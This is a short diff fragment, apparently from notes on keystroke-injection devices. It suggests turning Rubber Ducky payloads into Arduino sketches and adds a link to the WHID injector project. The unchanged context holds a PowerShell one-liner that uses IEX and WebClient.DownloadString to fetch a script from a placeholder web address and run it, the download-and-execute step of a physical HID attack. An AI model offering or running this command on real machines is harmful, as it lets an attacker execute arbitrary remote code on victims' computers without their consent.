@@ -45,4 +45,7 @@ Google "Rubber Ducky Payloads" -> Convert them to arduino sketches -> Don't forg
 
 `IEX ((New-Object System.Net.Webclient).DownloadString(\"YOUR_SCRIPT_HOSTED_ON_SOME_SITE_AS_RAW\")); exit`
 
+--- For the WHID
+https://github.com/whid-injector/WHID
+
 
